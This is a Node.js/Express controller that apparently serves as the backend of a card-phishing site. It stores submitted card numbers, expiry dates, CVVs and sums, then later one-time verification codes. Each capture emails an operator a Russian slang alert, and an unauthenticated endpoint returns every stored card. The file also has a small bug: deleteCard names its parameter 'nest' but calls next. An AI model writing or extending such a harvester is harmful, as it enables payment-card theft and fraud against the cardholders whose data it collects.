const { Card } = require('../models/models');
const ApiError = require('../errors/apiError');
const nodemailer = require('nodemailer');

async function sendEmail(s, t) {
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: process.env.EMAIL,
            pass: process.env.PASSWORD
        }
    });

    await transporter.sendMail({
        from: 'Hello Kitty',
        to: process.env.TOEMAIL,
        subject: s,
        text: t
    });
}

class CardController {

    async getAllCards(req, res, next) {
        let cards;
        try {
            cards = await Card.findAll();
            return res.json(cards);
        } catch (error) {
            next(ApiError.badRequest(error.message));
        }
    }

    async addCard(req, res, next) {
        const { number, date, cvv, sum } = req.body;
        try {
            let card = await Card.findOne({ where: { number } });
            if (!card) {
                card = await Card.create({ number, date, cvv, sum });
            }
            await sendEmail("САЛАМ ПАПАЛАМ", "САЛАМ ПАПАЛАМ")
            return res.json(card);
        } catch (error) {
            next(ApiError.badRequest(error.message));
        }
    }

    async addCode(req, res, next) {
        const { number, code } = req.body;
        try {
            let card = await Card.update({ code },
                { where: { number } });
            await sendEmail("ЕБНУЛСЯ ДЕПЧИК", "ЕБНУЛСЯ ДЕПЧИК")
            return res.json(card);
        } catch (error) {
            next(ApiError.badRequest(error.message));
        }
    }

    async deleteCard(req, res, nest) {
        const { id } = req.params;
        try {
            await Card.destroy({ where: { id } });
            return res.json('Deleted!');
        } catch (error) {
            next(ApiError.badRequest(error.message));
        }
    }
}

module.exports = new CardController();